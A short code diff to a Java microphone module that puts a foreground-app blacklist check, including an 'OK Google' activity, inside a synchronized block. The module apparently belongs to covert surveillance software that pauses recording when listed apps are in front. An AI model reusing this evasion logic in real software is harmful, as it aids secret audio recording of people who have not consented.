@@ -506,26 +506,28 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (isForegroundBlacklist) checking \""+foreground+"\'");
 		}
-		for (String bl : blacklist) {
-			if (foreground.contains(bl)) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (isForegroundBlacklist) found blacklist");
-				}
-				if (foreground.contains(Status.OK_GOOGLE_ACTIVITY)) {
-					if (pm != null && !pm.isScreenOn()) {
-						Check.log(TAG + " (isForegroundBlacklist) skip adding OK_GOOGLE when screen is off");
-						return false;
+		synchronized (this) {
+			for (String bl : blacklist) {
+				if (foreground.contains(bl)) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (isForegroundBlacklist) found blacklist");
 					}
-					if (!inStoplist(Status.STOP_REASON_OK_GOOGLE)) {
-						addStop(Status.STOP_REASON_OK_GOOGLE);
-					}
+					if (foreground.contains(Status.OK_GOOGLE_ACTIVITY)) {
+						if (pm != null && !pm.isScreenOn()) {
+							Check.log(TAG + " (isForegroundBlacklist) skip adding OK_GOOGLE when screen is off");
+							return false;
+						}
+						if (!inStoplist(Status.STOP_REASON_OK_GOOGLE)) {
+							addStop(Status.STOP_REASON_OK_GOOGLE);
+						}
 
-				} else {
-					if (!inStoplist(STOP_REASON_PROCESS)) {
-						addStop(STOP_REASON_PROCESS);
+					} else {
+						if (!inStoplist(STOP_REASON_PROCESS)) {
+							addStop(STOP_REASON_PROCESS);
+						}
 					}
+					return true;
 				}
-				return true;
 			}
 		}
 		if(inStoplist(STOP_REASON_PROCESS)) {
